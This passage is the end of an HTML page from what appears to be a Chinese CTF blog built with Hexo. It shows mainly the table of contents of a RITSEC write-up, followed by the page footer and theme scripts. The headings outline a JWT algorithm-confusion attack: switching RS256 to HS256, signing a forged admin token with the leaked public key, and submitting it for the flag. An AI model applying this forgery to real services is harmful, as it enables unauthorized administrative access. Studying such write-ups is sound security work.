href="#我们可以到https-jwt-io-去解密token，token的内容如下："><span class="nav-number">1.0.1.6.</span> <span class="nav-text">我们可以到https://jwt.io/去解密token，token的内容如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#显然，我们必须伪造自己的token，并将type中的user设置为admin，但是我们必须使用私钥对其进行签名，否则签名检查将会失败。"><span class="nav-number">1.0.1.7.</span> <span class="nav-text">显然，我们必须伪造自己的token，并将type中的user设置为admin，但是我们必须使用私钥对其进行签名，否则签名检查将会失败。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#刚开始，我尝试去修改这个算法和这个token的类型并且改变-quot-alg-quot-quot-RS256-quot-为-quot-alg-quot-quot-none-quot-，但是没有成功。"><span class="nav-number">1.0.1.8.</span> <span class="nav-text">刚开始，我尝试去修改这个算法和这个token的类型并且改变&quot;alg&quot;:&quot;RS256&quot;为&quot;alg&quot;:&quot;none&quot;，但是没有成功。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最后在查看API文档的源代码时，看到了这个注释-lt-Robots-can-help-you-with-the-api-gt-，我们访问robots-txt时得到了下面的内容。"><span class="nav-number">1.0.1.9.</span> <span class="nav-text">最后在查看API文档的源代码时，看到了这个注释&lt;!-- Robots can help you with the api --&gt;，我们访问robots.txt时得到了下面的内容。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因此，我们得到了signing-pem将用于验证JWT签名的公钥。这一定是一个提示，因此我们开始Google并且找到了这个：https-www-nccgroup-trust-uk-about-us-newsroom-and-events-blogs-2019-january-jwt-attack-walk-through"><span class="nav-number">1.0.1.10.</span> <span class="nav-text">因此，我们得到了signing.pem将用于验证JWT签名的公钥。这一定是一个提示，因此我们开始Google并且找到了这个：https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们修改头部并将算法-quot-alg-quot-quot-RS256-quot-RSA-更改为-quot-alg-quot-quot-HS256-quot-HMAC-，该算法使用共享密钥进行签名验证，然后，我们修改payload，并设置-quot-type-quot-quot-admin-quot-和创建我们的HMAC签名，并将public-key用作secret。当我们发送这个token到这个API时，他有望接收更改后的算法类型，并将签名作为HMAC类型进行处理，而public-key现在用作secret-key。"><span class="nav-number">1.0.1.11.</span> <span class="nav-text">我们修改头部并将算法&quot;alg&quot;:&quot;RS256&quot;(RSA)更改为&quot;alg&quot;:&quot;HS256&quot;(HMAC)，该算法使用共享密钥进行签名验证，然后，我们修改payload，并设置&quot;type&quot;:&quot;admin&quot;和创建我们的HMAC签名，并将public key用作secret。当我们发送这个token到这个API时，他有望接收更改后的算法类型，并将签名作为HMAC类型进行处理，而public key现在用作secret key。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#修改头部和payload并使用base64编码后的jWT如下："><span class="nav-number">1.0.1.12.</span> <span class="nav-text">修改头部和payload并使用base64编码后的jWT如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#然后，使用public-key作为secret创建HMAC签名，并将其转换为base64。"><span class="nav-number">1.0.1.13.</span> <span class="nav-text">然后，使用public key作为secret创建HMAC签名，并将其转换为base64。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#具有签名的JTW如下所示："><span class="nav-number">1.0.1.14.</span> <span class="nav-text">具有签名的JTW如下所示：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们发送这个token到API"><span class="nav-number">1.0.1.15.</span> <span class="nav-text">我们发送这个token到API</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#flag-RITSEC-JWT-th1s-0ne-d0wn"><span class="nav-number">1.0.1.16.</span> <span class="nav-text">flag: RITSEC{JWT_th1s_0ne_d0wn}</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#其余的几篇writeup如下："><span class="nav-number">1.0.2.</span> <span class="nav-text">其余的几篇writeup如下：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#ASIS-2019-Final-–-Trust-Zone"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">ASIS 2019 Final – Trust Zone</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ASIS-2019-Final-–-Andex"><span class="nav-number">1.0.2.2.</span> <span class="nav-text">ASIS 2019 Final – Andex</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考资料："><span class="nav-number">1.0.3.</span> <span class="nav-text">参考资料：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-www-nccgroup-trust-uk-about-us-newsroom-and-events-blogs-2019-january-jwt-attack-walk-through"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-www-sjoerdlangkemper-nl-2016-09-28-attacking-jwt-authentication"><span class="nav-number">1.0.3.2.</span> <span class="nav-text">https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#http-demo-sjoerdlangkemper-nl-jwtdemo-hs256-php"><span class="nav-number">1.0.3.3.</span> <span class="nav-text">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-jwt-io"><span class="nav-number">1.0.3.4.</span> <span class="nav-text">https://jwt.io</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-0xf4b1-github-io-ctftime-ctf-ritsec-club-web-our-first-api"><span class="nav-number">1.0.3.5.</span> <span class="nav-text">https://0xf4b1.github.io/ctftime/ctf.ritsec.club/web/our-first-api/</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-xz-aliyun-com-t-2338"><span class="nav-number">1.0.3.6.</span> <span class="nav-text">https://xz.aliyun.com/t/2338</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">66.4k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
